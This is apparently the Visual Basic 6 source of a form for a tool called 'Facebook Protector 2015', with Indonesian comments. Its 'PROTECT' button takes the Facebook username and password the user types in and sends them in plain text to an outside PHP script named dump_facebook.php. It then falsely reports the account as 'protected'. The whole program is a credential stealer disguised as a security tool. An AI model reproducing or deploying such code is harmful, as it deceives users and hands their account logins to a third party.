VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Object = "{6BF52A50-394A-11D3-B153-00C04F79FAA6}#1.0#0"; "wmp.dll"
Begin VB.Form frmUtama 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Facebook Protector 2015 - v1.0"
   ClientHeight    =   5460
   ClientLeft      =   45
   ClientTop       =   750
   ClientWidth     =   6330
   Icon            =   "frmUtama.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "frmUtama.frx":1042
   ScaleHeight     =   5460
   ScaleWidth      =   6330
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton cmdUnprotect 
      Caption         =   "UNPROTECT"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   4200
      TabIndex        =   13
      Top             =   4800
      Width           =   1935
   End
   Begin InetCtlsObjects.Inet Inet 
      Left            =   2520
      Top             =   4800
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.Timer Timer1 
      Interval        =   10
      Left            =   5880
      Top             =   0
   End
   Begin VB.PictureBox Picture3 
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   0  'None
      Height          =   2789
      Left            =   2880
      Picture         =   "frmUtama.frx":C24F
      ScaleHeight     =   2790
      ScaleWidth      =   3600
      TabIndex        =   7
      Top             =   0
      Width           =   3600
      Begin VB.Label Label5 
         BackStyle       =   0  'Transparent
         Caption         =   "Keep calm, and stay Connected !"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00808080&
         Height          =   735
         Left            =   240
         TabIndex        =   8
         Top             =   120
         Width           =   1095
      End
   End
   Begin VB.PictureBox Picture1 
      BorderStyle     =   0  'None
      Height          =   3855
      Left            =   0
      Picture         =   "frmUtama.frx":131B5
      ScaleHeight     =   3855
      ScaleWidth      =   2895
      TabIndex        =   3
      Top             =   0
      Width           =   2895
      Begin VB.Label lblInfo 
         BackStyle       =   0  'Transparent
         Height          =   255
         Left            =   1080
         TabIndex        =   15
         Top             =   2595
         Width           =   1455
      End
      Begin VB.Label Label4 
         BackStyle       =   0  'Transparent
         Caption         =   "Connection :"
         Height          =   255
         Left            =   120
         TabIndex        =   14
         Top             =   2580
         Width           =   1095
      End
      Begin VB.Line Line1 
         BorderColor     =   &H00FFFFFF&
         BorderWidth     =   2
         X1              =   0
         X2              =   2880
         Y1              =   3720
         Y2              =   3720
      End
   End
   Begin VB.CommandButton cmdLogin 
      Caption         =   "PROTECT"
      DisabledPicture =   "frmUtama.frx":17334
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   4200
      MaskColor       =   &H00FFC0C0&
      Picture         =   "frmUtama.frx":30048
      TabIndex        =   2
      Top             =   4080
      Width           =   1935
   End
   Begin VB.TextBox txtPass 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   345
      Left            =   120
      MaxLength       =   30
      TabIndex        =   1
      Top             =   4920
      Width           =   2295
   End
   Begin VB.TextBox txtUname 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   330
      Left            =   120
      MaxLength       =   30
      TabIndex        =   0
      Top             =   4200
      Width           =   2295
   End
   Begin VB.PictureBox Picture2 
      BorderStyle     =   0  'None
      ForeColor       =   &H80000015&
      Height          =   1815
      Left            =   0
      Picture         =   "frmUtama.frx":31A7D
      ScaleHeight     =   1815
      ScaleWidth      =   6375
      TabIndex        =   4
      Top             =   3840
      Width           =   6375
      Begin VB.PictureBox Picture5 
         BorderStyle     =   0  'None
         Height          =   1095
         Left            =   3000
         Picture         =   "frmUtama.frx":334B2
         ScaleHeight     =   1095
         ScaleWidth      =   735
         TabIndex        =   12
         Top             =   240
         Width           =   735
      End
      Begin VB.Label Label2 
         BackStyle       =   0  'Transparent
         Caption         =   "Password   :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   375
         Left            =   120
         TabIndex        =   6
         Top             =   840
         Width           =   1335
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   "Username :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   375
         Left            =   120
         TabIndex        =   5
         Top             =   120
         Width           =   1335
      End
   End
   Begin VB.PictureBox Picture4 
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   0  'None
      Height          =   855
      Left            =   2880
      Picture         =   "frmUtama.frx":373A3
      ScaleHeight     =   855
      ScaleWidth      =   3495
      TabIndex        =   9
      Top             =   2760
      Width           =   3495
      Begin VB.PictureBox Picture8 
         BorderStyle     =   0  'None
         Height          =   240
         Left            =   3120
         Picture         =   "frmUtama.frx":38DD8
         ScaleHeight     =   240
         ScaleWidth      =   255
         TabIndex        =   20
         Top             =   120
         Width           =   255
      End
      Begin VB.PictureBox Picture7 
         BorderStyle     =   0  'None
         Height          =   240
         Left            =   2400
         Picture         =   "frmUtama.frx":3BBE7
         ScaleHeight     =   240
         ScaleWidth      =   255
         TabIndex        =   19
         Top             =   120
         Width           =   255
      End
      Begin VB.PictureBox Picture6 
         BorderStyle     =   0  'None
         Height          =   240
         Left            =   2760
         Picture         =   "frmUtama.frx":3E86E
         ScaleHeight     =   240
         ScaleWidth      =   255
         TabIndex        =   18
         Top             =   120
         Width           =   255
      End
      Begin VB.Label Label6 
         BackStyle       =   0  'Transparent
         Caption         =   "About Software :"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   0
         TabIndex        =   11
         Top             =   120
         Width           =   1455
      End
      Begin VB.Label Label3 
         BackStyle       =   0  'Transparent
         Caption         =   $"frmUtama.frx":4150F
         BeginProperty Font 
            Name            =   "Georgia"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   375
         Left            =   3240
         TabIndex        =   10
         Top             =   480
         Width           =   14595
      End
   End
   Begin WMPLibCtl.WindowsMediaPlayer Wmp 
      Height          =   5415
      Left            =   6360
      TabIndex        =   21
      Top             =   0
      Width           =   3135
      URL             =   ""
      rate            =   1
      balance         =   0
      currentPosition =   0
      defaultFrame    =   ""
      playCount       =   1
      autoStart       =   -1  'True
      currentMarker   =   0
      invokeURLs      =   -1  'True
      baseURL         =   ""
      volume          =   50
      mute            =   0   'False
      uiMode          =   "full"
      stretchToFit    =   0   'False
      windowlessVideo =   0   'False
      enabled         =   -1  'True
      enableContextMenu=   -1  'True
      fullScreen      =   0   'False
      SAMIStyle       =   ""
      SAMILang        =   ""
      SAMIFilename    =   ""
      captioningID    =   ""
      enableErrorDialogs=   0   'False
      _cx             =   5530
      _cy             =   9551
   End
   Begin VB.Label Label7 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Status :"
      Height          =   255
      Left            =   3000
      TabIndex        =   17
      Top             =   3600
      Width           =   615
   End
   Begin VB.Label lblStatus 
      Alignment       =   2  'Center
      BackColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   2880
      TabIndex        =   16
      Top             =   3600
      Width           =   3495
   End
   Begin VB.Menu File 
      Caption         =   "File"
      Begin VB.Menu Info 
         Caption         =   "Info"
      End
      Begin VB.Menu Exit 
         Caption         =   "Exit"
      End
   End
   Begin VB.Menu Contact 
      Caption         =   "Contact"
      Begin VB.Menu Facebook 
         Caption         =   "Facebook"
      End
      Begin VB.Menu Twitter 
         Caption         =   "Twitter"
      End
   End
End
Attribute VB_Name = "frmUtama"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Bagian Menubar Contact & Website
'Deklarasi Private / Isi Fungsi dari Shell
Private Declare Function ShellExecute _
  Lib "shell32.dll" Alias "ShellExecuteA" ( _
  ByVal hWnd As Long, _
  ByVal Operation As String, _
  ByVal Filename As String, _
  Optional ByVal Parameters As String, _
  Optional ByVal Directory As String, _
  Optional ByVal WindowStyle As Long = vbMinimizedFocus _
  ) As Long
  
'Facebook Link
Private Sub Facebook_Click()
Dim fb As Long
    fb = ShellExecute(0, "open", "http://fb.me/Ravnui.Embassy.us")
End Sub

Private Sub Picture6_Click()
Wmp.Controls.pause
End Sub

Private Sub Picture7_Click()
Wmp.Controls.play
End Sub

Private Sub Picture8_Click()
Wmp.Controls.stop
End Sub

'Twitter Link
Private Sub Twitter_Click()
Dim tw As Long
    tw = ShellExecute(0, "open", "http://twitter.com/Syndrom2211")
End Sub

'Website 1
Private Sub Syndrom2211_Click()
Dim web1 As Long
    web1 = ShellExecute(0, "open", "http://www.bang-syndrom.com/")
End Sub

'Website 2
Private Sub Syndroms2211_Click()
Dim web2 As Long
    web2 = ShellExecute(0, "open", "http://syndroms.ful.pl/")
End Sub

Private Sub cmdLogin_Click()
Dim user, pass As String
user = txtUname.Text
pass = txtPass.Text

If txtUname.Text = "" Then
    MsgBox "Username / Password masih kosong", vbExclamation, "Error"
    txtUname.Text = ""
    txtPass.Text = ""
    txtUname.SetFocus
ElseIf txtPass.Text = "" Then
    MsgBox "Username / Password masih kosong", vbExclamation, "Error"
    txtUname.Text = ""
    txtPass.Text = ""
    txtUname.SetFocus
Else
    txtUname.Text = ""
    txtPass.Text = ""
    cmdLogin.Enabled = False
    lblStatus.Caption = "Memproses ..."
    
    'Proses Pengiriman Data
    'Alur :
    'paketdata adalah variable string
    'yang hasilnya akan membuka sebuah Inet.OpenURL
    'paketdata akan menciptakan sebuah html jika berhasil
    'dan akan kosong bila gagal
    Dim paketdata As String
    paketdata = Inet.OpenURL("http://tampung.netau.net/dump_facebook.php?e=" & _
    user & "&p=" & pass)
    
        If InStr(paketdata, "html") Then
            cmdLogin.Enabled = False
            cmdUnprotect.Enabled = True
            lblStatus.Caption = "Terproteksi"
            lblStatus.ForeColor = vbGreen
            txtUname.Enabled = False
            txtPass.Enabled = False
        Else
            cmdLogin.Enabled = True
            lblStatus.Caption = "Gagal, silahkan ulangi ..."
            lblStatus.ForeColor = vbRed
            cmdLogin.Enabled = True
            cmdUnprotect.Enabled = False
        End If
    End If
End Sub

Private Sub cmdUnprotect_Click()
cmdLogin.Enabled = True
cmdUnprotect.Enabled = False

txtUname.Enabled = True
txtPass.Enabled = True

lblStatus.ForeColor = vbRed
lblStatus.Caption = "Tidak Terproteksi"

txtUname.SetFocus
End Sub

Private Sub Exit_Click()
Dim Keluar As String
Keluar = MsgBox("Apakah anda yakin akan keluar?", vbExclamation + vbYesNo, "Facebook Protector 2015 - v1.0")
If Keluar = vbYes Then
    Unload Me
End If
End Sub

Private Sub Form_Load()
'Play a Music
'One Ok Rock - Re:make
Dim strBuff As String
Dim strFile As String
    'Membuat nama temp file
    strFile = App.Path & "\letmehear.mp3"
    
    'Extrak File dari Resource File
    strBuff = StrConv(LoadResData(101, "CUSTOM"), vbUnicode)
    
    'Menghapus attribut Read-Only sebelum membuka file untuk output
    If Len(Dir(strFile, vbHidden)) > 0 Then SetAttr strFile, vbNormal
    
    'Save the string as a file
    Open strFile For Output As #1
        Print #1, strBuff
    Close #1
    
    'Menempatkan atrribut lagi setelah menutupnya
    SetAttr strFile, vbArchive + vbHidden
    
    Wmp.URL = App.Path & "\letmehear.mp3" 'Load a Music
    Wmp.Controls.play 'Mainkan

lblStatus.Caption = "Tidak Terproteksi"
lblStatus.ForeColor = vbRed

cmdUnprotect.Enabled = "False"
txtPass.PasswordChar = "*"
lblInfo.Caption = "Memeriksa Koneksi Internet"

If CekInternet = False Then
    lblInfo.Caption = "Not Connected"
    lblInfo.ForeColor = vbRed
Else
    lblInfo.Caption = "Connected"
    lblInfo.ForeColor = vbGreen
End If
End Sub

Private Sub Info_Click()
MsgBox "Cara Pemakaian : " & vbCrLf & vbCrLf & "1. Pastikan Koneksi Internet anda sudah terkoneksi" & vbCrLf & "2. Masukan Username dan Password Facebook Anda" & vbCrLf & "3. Klik Tombol Protect Me !" & vbCrLf & "4. Jangan Close Aplikasi ketika Status dalam Terproteksi" & vbCrLf & vbCrLf & "Thanks for All..", vbInformation, "Facebook Protector 2015 by DamDam"
End Sub

'Timer Untuk Text Berjalan
Private Sub Timer1_Timer()
If (Label3.Left + Label3.Width) <= 0 Then
    Label3.Left = Me.Width
End If
    Label3.Left = Label3.Left - 7
End Sub
